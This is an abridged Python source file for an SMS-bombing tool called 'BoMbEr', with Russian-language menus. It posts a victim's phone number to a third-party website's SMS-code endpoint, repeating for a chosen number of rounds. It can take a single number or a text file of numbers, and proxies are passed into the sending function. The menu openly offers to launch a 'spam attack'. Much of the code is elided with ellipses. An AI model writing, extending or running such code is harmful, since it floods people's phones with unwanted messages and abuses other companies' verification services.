...
def MAIN():
	try:
		...
		def Main():
			...
			def sms():
				...
				try:
					...
					try:
						...
						requests.post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax333.php?do=sms_code",data={"phone": phonee})
					except:
						pass
					try:
			...
			def logo():
				logo = Fore.GREEN+"BoMbEr"+Style.RESET_ALL
				print(logo)
			...
			def onesend():
				...
				try:
					if int(phone):
						print('Введите кол-во кругов ("Enter" - отмена):')
			...
			def filesend():
				...
				f_name=input(Fore.BLUE+"BoMbEr > "+Style.RESET_ALL+"~/")
				clear()
				logo()
				print(info)
				try:
			...
			def n_send(phone, count, proxies):
				...
				print(Fore.GREEN+"\nСпам атака на {} закончен. Кол-во кругов {}".format(phone, count)+Style.RESET_ALL)
				exit()
			...
			def main():
				...
				while True:
					...
					print("1) Запуск спам атаки.")
					print("2) Проверить есть ли номер телефона в антиспам листе.")
					print("3) Добавить номер телефона в антиспам лист.")
					...
					if input1 == "1":
						...
						print("1. Ввести телефонный номер")
						print("2. Выгрузить номера из TXT файла ")
						print("( Чтобы выйти на главное меню нажмите ENTER )")
						input11= input(Fore.BLUE+"BoMbEr > "+Style.RESET_ALL)
						if input11 == "1":
							onesend()
